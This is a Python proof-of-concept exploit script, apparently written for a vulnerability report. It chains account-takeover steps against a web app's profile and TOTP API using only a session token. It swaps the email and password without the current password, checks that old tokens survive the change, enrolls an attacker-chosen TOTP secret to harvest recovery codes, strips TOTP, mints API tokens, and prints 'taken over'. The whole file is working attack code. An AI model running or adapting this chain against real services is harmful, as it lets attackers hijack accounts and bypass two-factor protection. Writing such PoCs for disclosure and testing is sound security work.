#!/usr/bin/env python3
"""PoC: session-alone profile/TOTP takeover primitives.

Usage:
  python3 poc.py --base http://localhost:8000 -u USER -p PASS --new-password "twili8t" --email "twili8t@domain.com"

What it proves: with only USER's session,
(1) email+password change without current-password proof,
(2) old token survives the password change,
(3) attacker-chosen TOTP secret enrolls and returns recovery codes,
(4) TOTP strip works, 
(5) token mint works.
"""

import argparse, base64, hashlib, hmac, json, struct, time, urllib.request, urllib.error

def req(base, method, path, token=None, data=None):
    r = urllib.request.Request(base + path,
        data=json.dumps(data).encode() if data is not None else None,
        headers={"Content-Type": "application/json",
                 **({"Authorization": "Token " + token} if token else {})},
        method=method)
    try:
        with urllib.request.urlopen(r, timeout=30) as x:
            return x.status, x.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()

def totp_code(secret_b32, skew=0):
    s = base64.b32decode(secret_b32)
    c = int(time.time()) // 30 + skew
    h = hmac.new(s, struct.pack(">Q", c), hashlib.sha1).digest()
    o = h[-1] & 0x0F
    v = struct.unpack(">I", bytearray([h[o] & 0x7F]) + h[o+1:o+4])[0] % 10**6
    return f"{v:06d}"

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", required=True);
    ap.add_argument("-u", required=True)
    ap.add_argument("-p", required=True);
    ap.add_argument("--new-password", default="Pwned12345!", required=True)
    ap.add_argument("--email", default="taken-over@example.com")
    a = ap.parse_args()
    st, body = req(a.base, "POST", "/api/token/", data={"username": a.u, "password": a.p})
    assert st == 200, f"login failed: {st} {body[:100]}"
    tok = json.loads(body)["token"]
    print("[*] session token:", tok[:8] + "...")
    ok = {}

    st, body = req(a.base, "PATCH", "/api/profile/", tok, {"email": a.email})
    ok["email-without-reauth"] = st == 200 and a.email.encode() in body
    print(f"[{'PASS' if ok['email-without-reauth'] else 'FAIL'}] email swap, no current password: HTTP {st}")

    st, body = req(a.base, "PATCH", "/api/profile/", tok, {"password": a.new_password})
    ok["password-without-current"] = st == 200
    print(f"[{'PASS' if ok['password-without-current'] else 'FAIL'}] password change, no current password: HTTP {st}")

    st, _ = req(a.base, "GET", "/api/profile/", tok)
    ok["old-token-survives-password-change"] = st == 200
    print(f"[{'PASS' if ok['old-token-survives-password-change'] else 'FAIL'}] OLD token still valid after password change: HTTP {st}")

    secret = base64.b32encode(b"attacker-secret-1!").decode()
    enrolled = False
    for skew in (-1, 0, 1):
        st, body = req(a.base, "POST", "/api/profile/totp/", tok,
                        {"secret": secret, "code": totp_code(secret, skew)})
        if b'"success":true' in body:
            enrolled = True; codes = json.loads(body).get("recovery_codes"); break
    ok["attacker-totp-enroll"] = enrolled
    print(f"[{'PASS' if enrolled else 'FAIL'}] attacker-chosen TOTP secret enrolled, codes returned")

    st, body = req(a.base, "DELETE", "/api/profile/totp/", tok)
    ok["totp-strip-no-reauth"] = st == 200
    print(f"[{'PASS' if ok['totp-strip-no-reauth'] else 'FAIL'}] TOTP strip, no re-auth: HTTP {st}")

    st, body = req(a.base, "POST", "/api/profile/generate_auth_token/", tok)
    ok["token-mint-on-session"] = st == 200 and len(body.strip(b'"')) > 20
    print(f"[{'PASS' if ok['token-mint-on-session'] else 'FAIL'}] API token mint on session alone: HTTP {st}")

    print("\ntaken over"
          if all(ok.values()) else f"PARTIAL — {ok}")

if __name__ == "__main__":
    main()
